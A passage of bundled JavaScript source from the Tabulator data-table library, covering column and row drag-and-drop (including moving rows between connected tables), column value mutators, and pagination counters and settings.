        prevColWidth = prevCol ? prevCol.getWidth() / 2 : 0;
        nextColWidthLast = 0;
        prevColWidthLast = 0;
        startXMove = false;
        this.startMove(e2, column);
      }, this.checkPeriod);
    }, { passive: true });
    colEl.addEventListener("touchmove", (e2) => {
      var diff2, moveToCol;
      if (this.moving) {
        this.moveHover(e2);
        if (!startXMove) {
          startXMove = e2.touches[0].pageX;
        }
        diff2 = e2.touches[0].pageX - startXMove;
        if (diff2 > 0) {
          if (nextCol && diff2 - nextColWidthLast > nextColWidth) {
            moveToCol = nextCol;
            if (moveToCol !== column) {
              startXMove = e2.touches[0].pageX;
              moveToCol.getElement().parentNode.insertBefore(this.placeholderElement, moveToCol.getElement().nextSibling);
              this.moveColumn(moveToCol, true);
            }
          }
        } else {
          if (prevCol && -diff2 - prevColWidthLast > prevColWidth) {
            moveToCol = prevCol;
            if (moveToCol !== column) {
              startXMove = e2.touches[0].pageX;
              moveToCol.getElement().parentNode.insertBefore(this.placeholderElement, moveToCol.getElement());
              this.moveColumn(moveToCol, false);
            }
          }
        }
        if (moveToCol) {
          nextCol = moveToCol.nextColumn();
          nextColWidthLast = nextColWidth;
          nextColWidth = nextCol ? nextCol.getWidth() / 2 : 0;
          prevCol = moveToCol.prevColumn();
          prevColWidthLast = prevColWidth;
          prevColWidth = prevCol ? prevCol.getWidth() / 2 : 0;
        }
      }
    }, { passive: true });
    colEl.addEventListener("touchend", (e2) => {
      if (this.checkTimeout) {
        clearTimeout(this.checkTimeout);
      }
      if (this.moving) {
        this.endMove(e2);
      }
    });
  }
  startMove(e2, column) {
    var element = column.getElement(), headerElement = this.table.columnManager.getContentsElement(), headersElement = this.table.columnManager.getHeadersElement();
    if (this.table.modules.selectRange && this.table.modules.selectRange.columnSelection) {
      if (this.table.modules.selectRange.mousedown && this.table.modules.selectRange.selecting === "column") {
        return;
      }
    }
    this.moving = column;
    this.startX = (this.touchMove ? e2.touches[0].pageX : e2.pageX) - Helpers.elOffset(element).left;
    this.table.element.classList.add("tabulator-block-select");
    this.placeholderElement.style.width = column.getWidth() + "px";
    this.placeholderElement.style.height = column.getHeight() + "px";
    element.parentNode.insertBefore(this.placeholderElement, element);
    element.parentNode.removeChild(element);
    this.hoverElement = element.cloneNode(true);
    this.hoverElement.classList.add("tabulator-moving");
    headerElement.appendChild(this.hoverElement);
    this.hoverElement.style.left = "0";
    this.hoverElement.style.bottom = headerElement.clientHeight - headersElement.offsetHeight + "px";
    if (!this.touchMove) {
      this._bindMouseMove();
      document.body.addEventListener("mousemove", this.moveHover);
      document.body.addEventListener("mouseup", this.endMove);
    }
    this.moveHover(e2);
    this.dispatch("column-moving", e2, this.moving);
  }
  _bindMouseMove() {
    this.table.columnManager.columnsByIndex.forEach(function(column) {
      if (column.modules.moveColumn.mousemove) {
        column.getElement().addEventListener("mousemove", column.modules.moveColumn.mousemove);
      }
    });
  }
  _unbindMouseMove() {
    this.table.columnManager.columnsByIndex.forEach(function(column) {
      if (column.modules.moveColumn.mousemove) {
        column.getElement().removeEventListener("mousemove", column.modules.moveColumn.mousemove);
      }
    });
  }
  moveColumn(column, after) {
    var movingCells = this.moving.getCells();
    this.toCol = column;
    this.toColAfter = after;
    if (after) {
      column.getCells().forEach(function(cell, i2) {
        var cellEl = cell.getElement(true);
        if (cellEl.parentNode && movingCells[i2]) {
          cellEl.parentNode.insertBefore(movingCells[i2].getElement(), cellEl.nextSibling);
        }
      });
    } else {
      column.getCells().forEach(function(cell, i2) {
        var cellEl = cell.getElement(true);
        if (cellEl.parentNode && movingCells[i2]) {
          cellEl.parentNode.insertBefore(movingCells[i2].getElement(), cellEl);
        }
      });
    }
  }
  endMove(e2) {
    if (e2.which === 1 || this.touchMove) {
      this._unbindMouseMove();
      this.placeholderElement.parentNode.insertBefore(this.moving.getElement(), this.placeholderElement.nextSibling);
      this.placeholderElement.parentNode.removeChild(this.placeholderElement);
      this.hoverElement.parentNode.removeChild(this.hoverElement);
      this.table.element.classList.remove("tabulator-block-select");
      if (this.toCol) {
        this.table.columnManager.moveColumnActual(this.moving, this.toCol, this.toColAfter);
      }
      this.moving = false;
      this.toCol = false;
      this.toColAfter = false;
      if (!this.touchMove) {
        document.body.removeEventListener("mousemove", this.moveHover);
        document.body.removeEventListener("mouseup", this.endMove);
      }
    }
  }
  moveHover(e2) {
    var columnHolder = this.table.columnManager.getContentsElement(), scrollLeft = columnHolder.scrollLeft, xPos = (this.touchMove ? e2.touches[0].pageX : e2.pageX) - Helpers.elOffset(columnHolder).left + scrollLeft, scrollPos;
    this.hoverElement.style.left = xPos - this.startX + "px";
    if (xPos - scrollLeft < this.autoScrollMargin) {
      if (!this.autoScrollTimeout) {
        this.autoScrollTimeout = setTimeout(() => {
          scrollPos = Math.max(0, scrollLeft - 5);
          this.table.rowManager.getElement().scrollLeft = scrollPos;
          this.autoScrollTimeout = false;
        }, 1);
      }
    }
    if (scrollLeft + columnHolder.clientWidth - xPos < this.autoScrollMargin) {
      if (!this.autoScrollTimeout) {
        this.autoScrollTimeout = setTimeout(() => {
          scrollPos = Math.min(columnHolder.clientWidth, scrollLeft + 5);
          this.table.rowManager.getElement().scrollLeft = scrollPos;
          this.autoScrollTimeout = false;
        }, 1);
      }
    }
  }
}
var defaultSenders = {
  delete: function(fromRow, toRow, toTable) {
    fromRow.delete();
  }
};
var defaultReceivers = {
  insert: function(fromRow, toRow, fromTable) {
    this.table.addRow(fromRow.getData(), void 0, toRow);
    return true;
  },
  add: function(fromRow, toRow, fromTable) {
    this.table.addRow(fromRow.getData());
    return true;
  },
  update: function(fromRow, toRow, fromTable) {
    if (toRow) {
      toRow.update(fromRow.getData());
      return true;
    }
    return false;
  },
  replace: function(fromRow, toRow, fromTable) {
    if (toRow) {
      this.table.addRow(fromRow.getData(), void 0, toRow);
      toRow.delete();
      return true;
    }
    return false;
  }
};
class MoveRows extends Module {
  static moduleName = "moveRow";
  //load defaults
  static senders = defaultSenders;
  static receivers = defaultReceivers;
  constructor(table) {
    super(table);
    this.placeholderElement = this.createPlaceholderElement();
    this.hoverElement = false;
    this.checkTimeout = false;
    this.checkPeriod = 150;
    this.moving = false;
    this.toRow = false;
    this.toRowAfter = false;
    this.hasHandle = false;
    this.startY = 0;
    this.startX = 0;
    this.moveHover = this.moveHover.bind(this);
    this.endMove = this.endMove.bind(this);
    this.tableRowDropEvent = false;
    this.touchMove = false;
    this.connection = false;
    this.connectionSelectorsTables = false;
    this.connectionSelectorsElements = false;
    this.connectionElements = [];
    this.connections = [];
    this.connectedTable = false;
    this.connectedRow = false;
    this.registerTableOption("movableRows", false);
    this.registerTableOption("movableRowsConnectedTables", false);
    this.registerTableOption("movableRowsConnectedElements", false);
    this.registerTableOption("movableRowsSender", false);
    this.registerTableOption("movableRowsReceiver", "insert");
    this.registerColumnOption("rowHandle");
  }
  createPlaceholderElement() {
    var el = document.createElement("div");
    el.classList.add("tabulator-row");
    el.classList.add("tabulator-row-placeholder");
    return el;
  }
  initialize() {
    if (this.table.options.movableRows) {
      this.connectionSelectorsTables = this.table.options.movableRowsConnectedTables;
      this.connectionSelectorsElements = this.table.options.movableRowsConnectedElements;
      this.connection = this.connectionSelectorsTables || this.connectionSelectorsElements;
      this.subscribe("cell-init", this.initializeCell.bind(this));
      this.subscribe("column-init", this.initializeColumn.bind(this));
      this.subscribe("row-init", this.initializeRow.bind(this));
    }
  }
  initializeGroupHeader(group) {
    var self = this, config = {};
    config.mouseup = function(e2) {
      self.tableRowDrop(e2, group);
    }.bind(self);
    config.mousemove = function(e2) {
      var rowEl;
      if (e2.pageY - Helpers.elOffset(group.element).top + self.table.rowManager.element.scrollTop > group.getHeight() / 2) {
        if (self.toRow !== group || !self.toRowAfter) {
          rowEl = group.getElement();
          rowEl.parentNode.insertBefore(self.placeholderElement, rowEl.nextSibling);
          self.moveRow(group, true);
        }
      } else {
        if (self.toRow !== group || self.toRowAfter) {
          rowEl = group.getElement();
          if (rowEl.previousSibling) {
            rowEl.parentNode.insertBefore(self.placeholderElement, rowEl);
            self.moveRow(group, false);
          }
        }
      }
    }.bind(self);
    group.modules.moveRow = config;
  }
  initializeRow(row) {
    var self = this, config = {}, rowEl;
    config.mouseup = function(e2) {
      self.tableRowDrop(e2, row);
    }.bind(self);
    config.mousemove = function(e2) {
      var rowEl2 = row.getElement();
      if (e2.pageY - Helpers.elOffset(rowEl2).top + self.table.rowManager.element.scrollTop > row.getHeight() / 2) {
        if (self.toRow !== row || !self.toRowAfter) {
          rowEl2.parentNode.insertBefore(self.placeholderElement, rowEl2.nextSibling);
          self.moveRow(row, true);
        }
      } else {
        if (self.toRow !== row || self.toRowAfter) {
          rowEl2.parentNode.insertBefore(self.placeholderElement, rowEl2);
          self.moveRow(row, false);
        }
      }
    }.bind(self);
    if (!this.hasHandle) {
      rowEl = row.getElement();
      rowEl.addEventListener("mousedown", function(e2) {
        if (e2.which === 1) {
          self.checkTimeout = setTimeout(function() {
            self.startMove(e2, row);
          }, self.checkPeriod);
        }
      });
      rowEl.addEventListener("mouseup", function(e2) {
        if (e2.which === 1) {
          if (self.checkTimeout) {
            clearTimeout(self.checkTimeout);
          }
        }
      });
      this.bindTouchEvents(row, row.getElement());
    }
    row.modules.moveRow = config;
  }
  initializeColumn(column) {
    if (column.definition.rowHandle && this.table.options.movableRows !== false) {
      this.hasHandle = true;
    }
  }
  initializeCell(cell) {
    if (cell.column.definition.rowHandle && this.table.options.movableRows !== false) {
      var self = this, cellEl = cell.getElement(true);
      cellEl.addEventListener("mousedown", function(e2) {
        if (e2.which === 1) {
          self.checkTimeout = setTimeout(function() {
            self.startMove(e2, cell.row);
          }, self.checkPeriod);
        }
      });
      cellEl.addEventListener("mouseup", function(e2) {
        if (e2.which === 1) {
          if (self.checkTimeout) {
            clearTimeout(self.checkTimeout);
          }
        }
      });
      this.bindTouchEvents(cell.row, cellEl);
    }
  }
  bindTouchEvents(row, element) {
    var startYMove = false, nextRow, prevRow, nextRowHeight, prevRowHeight, nextRowHeightLast, prevRowHeightLast;
    element.addEventListener("touchstart", (e2) => {
      this.checkTimeout = setTimeout(() => {
        this.touchMove = true;
        nextRow = row.nextRow();
        nextRowHeight = nextRow ? nextRow.getHeight() / 2 : 0;
        prevRow = row.prevRow();
        prevRowHeight = prevRow ? prevRow.getHeight() / 2 : 0;
        nextRowHeightLast = 0;
        prevRowHeightLast = 0;
        startYMove = false;
        this.startMove(e2, row);
      }, this.checkPeriod);
    }, { passive: true });
    this.moving, this.toRow, this.toRowAfter;
    element.addEventListener("touchmove", (e2) => {
      var diff2, moveToRow;
      if (this.moving) {
        e2.preventDefault();
        this.moveHover(e2);
        if (!startYMove) {
          startYMove = e2.touches[0].pageY;
        }
        diff2 = e2.touches[0].pageY - startYMove;
        if (diff2 > 0) {
          if (nextRow && diff2 - nextRowHeightLast > nextRowHeight) {
            moveToRow = nextRow;
            if (moveToRow !== row) {
              startYMove = e2.touches[0].pageY;
              moveToRow.getElement().parentNode.insertBefore(this.placeholderElement, moveToRow.getElement().nextSibling);
              this.moveRow(moveToRow, true);
            }
          }
        } else {
          if (prevRow && -diff2 - prevRowHeightLast > prevRowHeight) {
            moveToRow = prevRow;
            if (moveToRow !== row) {
              startYMove = e2.touches[0].pageY;
              moveToRow.getElement().parentNode.insertBefore(this.placeholderElement, moveToRow.getElement());
              this.moveRow(moveToRow, false);
            }
          }
        }
        if (moveToRow) {
          nextRow = moveToRow.nextRow();
          nextRowHeightLast = nextRowHeight;
          nextRowHeight = nextRow ? nextRow.getHeight() / 2 : 0;
          prevRow = moveToRow.prevRow();
          prevRowHeightLast = prevRowHeight;
          prevRowHeight = prevRow ? prevRow.getHeight() / 2 : 0;
        }
      }
    });
    element.addEventListener("touchend", (e2) => {
      if (this.checkTimeout) {
        clearTimeout(this.checkTimeout);
      }
      if (this.moving) {
        this.endMove(e2);
        this.touchMove = false;
      }
    });
  }
  _bindMouseMove() {
    this.table.rowManager.getDisplayRows().forEach((row) => {
      if ((row.type === "row" || row.type === "group") && row.modules.moveRow && row.modules.moveRow.mousemove) {
        row.getElement().addEventListener("mousemove", row.modules.moveRow.mousemove);
      }
    });
  }
  _unbindMouseMove() {
    this.table.rowManager.getDisplayRows().forEach((row) => {
      if ((row.type === "row" || row.type === "group") && row.modules.moveRow && row.modules.moveRow.mousemove) {
        row.getElement().removeEventListener("mousemove", row.modules.moveRow.mousemove);
      }
    });
  }
  startMove(e2, row) {
    var element = row.getElement();
    this.setStartPosition(e2, row);
    this.moving = row;
    this.table.element.classList.add("tabulator-block-select");
    this.placeholderElement.style.width = row.getWidth() + "px";
    this.placeholderElement.style.height = row.getHeight() + "px";
    if (!this.connection) {
      element.parentNode.insertBefore(this.placeholderElement, element);
      element.parentNode.removeChild(element);
    } else {
      this.table.element.classList.add("tabulator-movingrow-sending");
      this.connectToTables(row);
    }
    this.hoverElement = element.cloneNode(true);
    this.hoverElement.classList.add("tabulator-moving");
    if (this.connection) {
      document.body.appendChild(this.hoverElement);
      this.hoverElement.style.left = "0";
      this.hoverElement.style.top = "0";
      this.hoverElement.style.width = this.table.element.clientWidth + "px";
      this.hoverElement.style.whiteSpace = "nowrap";
      this.hoverElement.style.overflow = "hidden";
      this.hoverElement.style.pointerEvents = "none";
    } else {
      this.table.rowManager.getTableElement().appendChild(this.hoverElement);
      this.hoverElement.style.left = "0";
      this.hoverElement.style.top = "0";
      this._bindMouseMove();
    }
    document.body.addEventListener("mousemove", this.moveHover);
    document.body.addEventListener("mouseup", this.endMove);
    this.dispatchExternal("rowMoving", row.getComponent());
    this.moveHover(e2);
  }
  setStartPosition(e2, row) {
    var pageX = this.touchMove ? e2.touches[0].pageX : e2.pageX, pageY = this.touchMove ? e2.touches[0].pageY : e2.pageY, element, position;
    element = row.getElement();
    if (this.connection) {
      position = element.getBoundingClientRect();
      this.startX = position.left - pageX + window.pageXOffset;
      this.startY = position.top - pageY + window.pageYOffset;
    } else {
      this.startY = pageY - element.getBoundingClientRect().top;
    }
  }
  endMove(e2) {
    if (!e2 || e2.which === 1 || this.touchMove) {
      this._unbindMouseMove();
      if (!this.connection) {
        this.placeholderElement.parentNode.insertBefore(this.moving.getElement(), this.placeholderElement.nextSibling);
        this.placeholderElement.parentNode.removeChild(this.placeholderElement);
      }
      this.hoverElement.parentNode.removeChild(this.hoverElement);
      this.table.element.classList.remove("tabulator-block-select");
      if (this.toRow) {
        this.table.rowManager.moveRow(this.moving, this.toRow, this.toRowAfter);
      } else {
        this.dispatchExternal("rowMoveCancelled", this.moving.getComponent());
      }
      this.moving = false;
      this.toRow = false;
      this.toRowAfter = false;
      document.body.removeEventListener("mousemove", this.moveHover);
      document.body.removeEventListener("mouseup", this.endMove);
      if (this.connection) {
        this.table.element.classList.remove("tabulator-movingrow-sending");
        this.disconnectFromTables();
      }
    }
  }
  moveRow(row, after) {
    this.toRow = row;
    this.toRowAfter = after;
  }
  moveHover(e2) {
    if (this.connection) {
      this.moveHoverConnections.call(this, e2);
    } else {
      this.moveHoverTable.call(this, e2);
    }
  }
  moveHoverTable(e2) {
    var rowHolder = this.table.rowManager.getElement(), scrollTop = rowHolder.scrollTop, yPos = (this.touchMove ? e2.touches[0].pageY : e2.pageY) - rowHolder.getBoundingClientRect().top + scrollTop;
    this.hoverElement.style.top = Math.min(yPos - this.startY, this.table.rowManager.element.scrollHeight - this.hoverElement.offsetHeight) + "px";
  }
  moveHoverConnections(e2) {
    this.hoverElement.style.left = this.startX + (this.touchMove ? e2.touches[0].pageX : e2.pageX) + "px";
    this.hoverElement.style.top = this.startY + (this.touchMove ? e2.touches[0].pageY : e2.pageY) + "px";
  }
  elementRowDrop(e2, element, row) {
    this.dispatchExternal("movableRowsElementDrop", e2, element, row ? row.getComponent() : false);
  }
  //establish connection with other tables
  connectToTables(row) {
    var connectionTables;
    if (this.connectionSelectorsTables) {
      connectionTables = this.commsConnections(this.connectionSelectorsTables);
      this.dispatchExternal("movableRowsSendingStart", connectionTables);
      this.commsSend(this.connectionSelectorsTables, "moveRow", "connect", {
        row
      });
    }
    if (this.connectionSelectorsElements) {
      this.connectionElements = [];
      if (!Array.isArray(this.connectionSelectorsElements)) {
        this.connectionSelectorsElements = [this.connectionSelectorsElements];
      }
      this.connectionSelectorsElements.forEach((query) => {
        if (typeof query === "string") {
          this.connectionElements = this.connectionElements.concat(Array.prototype.slice.call(document.querySelectorAll(query)));
        } else {
          this.connectionElements.push(query);
        }
      });
      this.connectionElements.forEach((element) => {
        var dropEvent = (e2) => {
          this.elementRowDrop(e2, element, this.moving);
        };
        element.addEventListener("mouseup", dropEvent);
        element.tabulatorElementDropEvent = dropEvent;
        element.classList.add("tabulator-movingrow-receiving");
      });
    }
  }
  //disconnect from other tables
  disconnectFromTables() {
    var connectionTables;
    if (this.connectionSelectorsTables) {
      connectionTables = this.commsConnections(this.connectionSelectorsTables);
      this.dispatchExternal("movableRowsSendingStop", connectionTables);
      this.commsSend(this.connectionSelectorsTables, "moveRow", "disconnect");
    }
    this.connectionElements.forEach((element) => {
      element.classList.remove("tabulator-movingrow-receiving");
      element.removeEventListener("mouseup", element.tabulatorElementDropEvent);
      delete element.tabulatorElementDropEvent;
    });
  }
  //accept incomming connection
  connect(table, row) {
    if (!this.connectedTable) {
      this.connectedTable = table;
      this.connectedRow = row;
      this.table.element.classList.add("tabulator-movingrow-receiving");
      this.table.rowManager.getDisplayRows().forEach((row2) => {
        if (row2.type === "row" && row2.modules.moveRow && row2.modules.moveRow.mouseup) {
          row2.getElement().addEventListener("mouseup", row2.modules.moveRow.mouseup);
        }
      });
      this.tableRowDropEvent = this.tableRowDrop.bind(this);
      this.table.element.addEventListener("mouseup", this.tableRowDropEvent);
      this.dispatchExternal("movableRowsReceivingStart", row, table);
      return true;
    } else {
      console.warn("Move Row Error - Table cannot accept connection, already connected to table:", this.connectedTable);
      return false;
    }
  }
  //close incoming connection
  disconnect(table) {
    if (table === this.connectedTable) {
      this.connectedTable = false;
      this.connectedRow = false;
      this.table.element.classList.remove("tabulator-movingrow-receiving");
      this.table.rowManager.getDisplayRows().forEach((row) => {
        if (row.type === "row" && row.modules.moveRow && row.modules.moveRow.mouseup) {
          row.getElement().removeEventListener("mouseup", row.modules.moveRow.mouseup);
        }
      });
      this.table.element.removeEventListener("mouseup", this.tableRowDropEvent);
      this.dispatchExternal("movableRowsReceivingStop", table);
    } else {
      console.warn("Move Row Error - trying to disconnect from non connected table");
    }
  }
  dropComplete(table, row, success) {
    var sender = false;
    if (success) {
      switch (typeof this.table.options.movableRowsSender) {
        case "string":
          sender = MoveRows.senders[this.table.options.movableRowsSender];
          break;
        case "function":
          sender = this.table.options.movableRowsSender;
          break;
      }
      if (sender) {
        sender.call(this, this.moving ? this.moving.getComponent() : void 0, row ? row.getComponent() : void 0, table);
      } else {
        if (this.table.options.movableRowsSender) {
          console.warn("Mover Row Error - no matching sender found:", this.table.options.movableRowsSender);
        }
      }
      this.dispatchExternal("movableRowsSent", this.moving.getComponent(), row ? row.getComponent() : void 0, table);
    } else {
      this.dispatchExternal("movableRowsSentFailed", this.moving.getComponent(), row ? row.getComponent() : void 0, table);
    }
    this.endMove();
  }
  tableRowDrop(e2, row) {
    var receiver = false, success = false;
    e2.stopImmediatePropagation();
    switch (typeof this.table.options.movableRowsReceiver) {
      case "string":
        receiver = MoveRows.receivers[this.table.options.movableRowsReceiver];
        break;
      case "function":
        receiver = this.table.options.movableRowsReceiver;
        break;
    }
    if (receiver) {
      success = receiver.call(this, this.connectedRow.getComponent(), row ? row.getComponent() : void 0, this.connectedTable);
    } else {
      console.warn("Mover Row Error - no matching receiver found:", this.table.options.movableRowsReceiver);
    }
    if (success) {
      this.dispatchExternal("movableRowsReceived", this.connectedRow.getComponent(), row ? row.getComponent() : void 0, this.connectedTable);
    } else {
      this.dispatchExternal("movableRowsReceivedFailed", this.connectedRow.getComponent(), row ? row.getComponent() : void 0, this.connectedTable);
    }
    this.commsSend(this.connectedTable, "moveRow", "dropcomplete", {
      row,
      success
    });
  }
  commsReceived(table, action, data) {
    switch (action) {
      case "connect":
        return this.connect(table, data.row);
      case "disconnect":
        return this.disconnect(table);
      case "dropcomplete":
        return this.dropComplete(table, data.row, data.success);
    }
  }
}
var defaultMutators = {};
class Mutator extends Module {
  static moduleName = "mutator";
  //load defaults
  static mutators = defaultMutators;
  constructor(table) {
    super(table);
    this.allowedTypes = ["", "data", "edit", "clipboard", "import"];
    this.enabled = true;
    this.registerColumnOption("mutator");
    this.registerColumnOption("mutatorParams");
    this.registerColumnOption("mutatorData");
    this.registerColumnOption("mutatorDataParams");
    this.registerColumnOption("mutatorEdit");
    this.registerColumnOption("mutatorEditParams");
    this.registerColumnOption("mutatorClipboard");
    this.registerColumnOption("mutatorClipboardParams");
    this.registerColumnOption("mutatorImport");
    this.registerColumnOption("mutatorImportParams");
    this.registerColumnOption("mutateLink");
  }
  initialize() {
    this.subscribe("cell-value-changing", this.transformCell.bind(this));
    this.subscribe("cell-value-changed", this.mutateLink.bind(this));
    this.subscribe("column-layout", this.initializeColumn.bind(this));
    this.subscribe("row-data-init-before", this.rowDataChanged.bind(this));
    this.subscribe("row-data-changing", this.rowDataChanged.bind(this));
  }
  rowDataChanged(row, tempData, updatedData) {
    return this.transformRow(tempData, "data", updatedData);
  }
  //initialize column mutator
  initializeColumn(column) {
    var match2 = false, config = {};
    this.allowedTypes.forEach((type) => {
      var key = "mutator" + (type.charAt(0).toUpperCase() + type.slice(1)), mutator;
      if (column.definition[key]) {
        mutator = this.lookupMutator(column.definition[key]);
        if (mutator) {
          match2 = true;
          config[key] = {
            mutator,
            params: column.definition[key + "Params"] || {}
          };
        }
      }
    });
    if (match2) {
      column.modules.mutate = config;
    }
  }
  lookupMutator(value) {
    var mutator = false;
    switch (typeof value) {
      case "string":
        if (Mutator.mutators[value]) {
          mutator = Mutator.mutators[value];
        } else {
          console.warn("Mutator Error - No such mutator found, ignoring: ", value);
        }
        break;
      case "function":
        mutator = value;
        break;
    }
    return mutator;
  }
  //apply mutator to row
  transformRow(data, type, updatedData) {
    var key = "mutator" + (type.charAt(0).toUpperCase() + type.slice(1)), value;
    if (this.enabled) {
      this.table.columnManager.traverse((column) => {
        var mutator, params, component;
        if (column.modules.mutate) {
          mutator = column.modules.mutate[key] || column.modules.mutate.mutator || false;
          if (mutator) {
            value = column.getFieldValue(typeof updatedData !== "undefined" ? updatedData : data);
            if (type == "data" && !updatedData || typeof value !== "undefined") {
              component = column.getComponent();
              params = typeof mutator.params === "function" ? mutator.params(value, data, type, component) : mutator.params;
              column.setFieldValue(data, mutator.mutator(value, data, type, params, component));
            }
          }
        }
      });
    }
    return data;
  }
  //apply mutator to new cell value
  transformCell(cell, value) {
    if (cell.column.modules.mutate) {
      var mutator = cell.column.modules.mutate.mutatorEdit || cell.column.modules.mutate.mutator || false, tempData = {};
      if (mutator) {
        tempData = Object.assign(tempData, cell.row.getData());
        cell.column.setFieldValue(tempData, value);
        return mutator.mutator(value, tempData, "edit", mutator.params, cell.getComponent());
      }
    }
    return value;
  }
  mutateLink(cell) {
    var links = cell.column.definition.mutateLink;
    if (links) {
      if (!Array.isArray(links)) {
        links = [links];
      }
      links.forEach((link2) => {
        var linkCell = cell.row.getCell(link2);
        if (linkCell) {
          linkCell.setValue(linkCell.getValue(), true, true);
        }
      });
    }
  }
  enable() {
    this.enabled = true;
  }
  disable() {
    this.enabled = false;
  }
}
function rows(pageSize, currentRow, currentPage, totalRows, totalPages) {
  var el = document.createElement("span"), showingEl = document.createElement("span"), valueEl = document.createElement("span"), ofEl = document.createElement("span"), totalEl = document.createElement("span"), rowsEl = document.createElement("span");
  this.table.modules.localize.langBind("pagination|counter|showing", (value) => {
    showingEl.innerHTML = value;
  });
  this.table.modules.localize.langBind("pagination|counter|of", (value) => {
    ofEl.innerHTML = value;
  });
  this.table.modules.localize.langBind("pagination|counter|rows", (value) => {
    rowsEl.innerHTML = value;
  });
  if (totalRows) {
    valueEl.innerHTML = " " + currentRow + "-" + Math.min(currentRow + pageSize - 1, totalRows) + " ";
    totalEl.innerHTML = " " + totalRows + " ";
    el.appendChild(showingEl);
    el.appendChild(valueEl);
    el.appendChild(ofEl);
    el.appendChild(totalEl);
    el.appendChild(rowsEl);
  } else {
    valueEl.innerHTML = " 0 ";
    el.appendChild(showingEl);
    el.appendChild(valueEl);
    el.appendChild(rowsEl);
  }
  return el;
}
function pages(pageSize, currentRow, currentPage, totalRows, totalPages) {
  var el = document.createElement("span"), showingEl = document.createElement("span"), valueEl = document.createElement("span"), ofEl = document.createElement("span"), totalEl = document.createElement("span"), rowsEl = document.createElement("span");
  this.table.modules.localize.langBind("pagination|counter|showing", (value) => {
    showingEl.innerHTML = value;
  });
  valueEl.innerHTML = " " + currentPage + " ";
  this.table.modules.localize.langBind("pagination|counter|of", (value) => {
    ofEl.innerHTML = value;
  });
  totalEl.innerHTML = " " + totalPages + " ";
  this.table.modules.localize.langBind("pagination|counter|pages", (value) => {
    rowsEl.innerHTML = value;
  });
  el.appendChild(showingEl);
  el.appendChild(valueEl);
  el.appendChild(ofEl);
  el.appendChild(totalEl);
  el.appendChild(rowsEl);
  return el;
}
var defaultPageCounters = {
  rows,
  pages
};
class Page extends Module {
  static moduleName = "page";
  //load defaults
  static pageCounters = defaultPageCounters;
  constructor(table) {
    super(table);
    this.mode = "local";
    this.progressiveLoad = false;
    this.element = null;
    this.pageCounterElement = null;
    this.pageCounter = null;
    this.size = 0;
    this.page = 1;
    this.count = 5;
    this.max = 1;
    this.remoteRowCountEstimate = null;
    this.initialLoad = true;
    this.dataChanging = false;
    this.pageSizes = [];
    this.registerTableOption("pagination", false);
    this.registerTableOption("paginationMode", "local");
    this.registerTableOption("paginationSize", false);
    this.registerTableOption("paginationInitialPage", 1);
    this.registerTableOption("paginationCounter", false);
    this.registerTableOption("paginationCounterElement", false);
    this.registerTableOption("paginationButtonCount", 5);
    this.registerTableOption("paginationSizeSelector", false);
    this.registerTableOption("paginationElement", false);
    this.registerTableOption("paginationAddRow", "page");
    this.registerTableOption("paginationOutOfRange", false);
    this.registerTableOption("progressiveLoad", false);
    this.registerTableOption("progressiveLoadDelay", 0);
    this.registerTableOption("progressiveLoadScrollMargin", 0);
    this.registerTableFunction("setMaxPage", this.setMaxPage.bind(this));
    this.registerTableFunction("setPage", this.setPage.bind(this));
    this.registerTableFunction("setPageToRow", this.userSetPageToRow.bind(this));
    this.registerTableFunction("setPageSize", this.userSetPageSize.bind(this));
    this.registerTableFunction("getPageSize", this.getPageSize.bind(this));
    this.registerTableFunction("previousPage", this.previousPage.bind(this));
    this.registerTableFunction("nextPage", this.nextPage.bind(this));
    this.registerTableFunction("getPage", this.getPage.bind(this));
    this.registerTableFunction("getPageMax", this.getPageMax.bind(this));
    this.registerComponentFunction("row", "pageTo", this.setPageToRow.bind(this));
  }
  initialize() {
    if (this.table.options.pagination) {
      this.subscribe("row-deleted", this.rowsUpdated.bind(this));
      this.subscribe("row-added", this.rowsUpdated.bind(this));
      this.subscribe("data-processed", this.initialLoadComplete.bind(this));
      this.subscribe("table-built", this.calculatePageSizes.bind(this));
      this.subscribe("footer-redraw", this.footerRedraw.bind(this));
      if (this.table.options.paginationAddRow == "page") {
        this.subscribe("row-adding-position", this.rowAddingPosition.bind(this));
      }
      if (this.table.options.paginationMode === "remote") {
        this.subscribe("data-params", this.remotePageParams.bind(this));
        this.subscribe("data-loaded", this._parseRemoteData.bind(this));
      }
      if (this.table.options.progressiveLoad) {
        console.error("Progressive Load Error - Pagination and progressive load cannot be used at the same time");
      }
      this.registerDisplayHandler(this.restOnRenderBefore.bind(this), 40);
      this.registerDisplayHandler(this.getRows.bind(this), 50);
      this.createElements();
      this.initializePageCounter();
      this.initializePaginator();
    } else if (this.table.options.progressiveLoad) {
      this.subscribe("data-params", this.remotePageParams.bind(this));
      this.subscribe("data-loaded", this._parseRemoteData.bind(this));
      this.subscribe("table-built", this.calculatePageSizes.bind(this));
      this.subscribe("data-processed", this.initialLoadComplete.bind(this));
      this.initializeProgressive(this.table.options.progressiveLoad);
      if (this.table.options.progressiveLoad === "scroll") {
        this.subscribe("scroll-vertical", this.scrollVertical.bind(this));
      }
    }
  }
  rowAddingPosition(row, top2) {
    var rowManager = this.table.rowManager, displayRows = rowManager.getDisplayRows(), index;
    if (top2) {
      if (displayRows.length) {
        index = displayRows[0];
      } else {
        if (rowManager.activeRows.length) {
          index = rowManager.activeRows[rowManager.activeRows.length - 1];
          top2 = false;
        }
      }
    } else {
      if (displayRows.length) {
        index = displayRows[displayRows.length - 1];
        top2 = displayRows.length < this.size ? false : true;
      }
    }
    return { index, top: top2 };
  }
  calculatePageSizes() {
    var testElRow, testElCell;
    if (this.table.options.paginationSize) {
      this.size = this.table.options.paginationSize;
    } else {
      testElRow = document.createElement("div");
      testElRow.classList.add("tabulator-row");
      testElRow.style.visibility = "hidden";
      testElCell = document.createElement("div");
      testElCell.classList.add("tabulator-cell");
      testElCell.innerHTML = "Page Row Test";
      testElRow.appendChild(testElCell);
      this.table.rowManager.getTableElement().appendChild(testElRow);
      this.size = Math.floor(this.table.rowManager.getElement().clientHeight / testElRow.offsetHeight);
      this.table.rowManager.getTableElement().removeChild(testElRow);
    }
    this.dispatchExternal("pageSizeChanged", this.size);
    this.generatePageSizeSelectList();
  }
  initialLoadComplete() {
    this.initialLoad = false;
  }
  remotePageParams(data, config, silent, params) {
    if (!this.initialLoad) {
      if (this.progressiveLoad && !silent || !this.progressiveLoad && !this.dataChanging) {
        this.reset(true);
      }
    }
    params.page = this.page;
    if (this.size) {
      params.size = this.size;
    }
    return params;
  }
  ///////////////////////////////////
  ///////// Table Functions /////////
  ///////////////////////////////////
